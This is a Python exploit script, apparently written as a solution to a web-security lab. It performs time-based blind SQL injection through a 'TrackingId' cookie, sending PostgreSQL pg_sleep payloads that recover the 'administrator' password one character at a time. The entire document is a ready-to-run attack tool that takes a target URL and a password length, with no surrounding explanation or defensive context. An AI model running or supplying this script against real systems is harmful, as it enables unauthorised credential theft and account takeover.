import requests
import urllib.parse
import urllib3
import sys
import time

# Disable insecure request warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Proxy settings for debugging (e.g., with Burp Suite)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def brute_force(url, length):
    password = ""
    try:
        r = requests.get(url, verify=False, proxies=proxies)
    except requests.RequestException as e:
        print(f"Error fetching URL: {e}")
        return

    cookies = r.cookies.get('TrackingId')
    if not cookies:
        print("No 'TrackingId' cookie found")
        return

    session_cookie = r.cookies.get('session')
    for i in range(1, length + 1):
        for j in range(32, 126):
            sqli_payload = f"';SELECT CASE WHEN (username='administrator' AND ascii(substring(password, {i}, 1))={j}) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--"
            encoded_payload = urllib.parse.quote(sqli_payload)
            new_cookies = {"TrackingId": cookies + encoded_payload, 'session': session_cookie}

            try:
                start_time = time.time()
                new_r = requests.get(url, cookies=new_cookies, verify=False, proxies=proxies)
                end_time = time.time()
            except requests.RequestException as e:
                print(f"Error sending request: {e}")
                return

            # Check if the response time indicates a match
            if end_time - start_time >= 10:
                password += chr(j)
                sys.stdout.write('\r' + password)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' + password + chr(j))
                sys.stdout.flush()

    print("\nCompleted")


def main():
    if len(sys.argv) != 3:
        print(f"(+) Usage: {sys.argv[0]} <url> <length>")
        print(f"(+) Example: {sys.argv[0]} www.example.com 20")
        sys.exit(1)

    url = sys.argv[1]
    try:
        length = int(sys.argv[2])
    except ValueError:
        print("(-) Length must be an integer")
        sys.exit(1)

    print("(+) Retrieving administrator password...")
    brute_force(url, length)


if __name__ == "__main__":
    main()
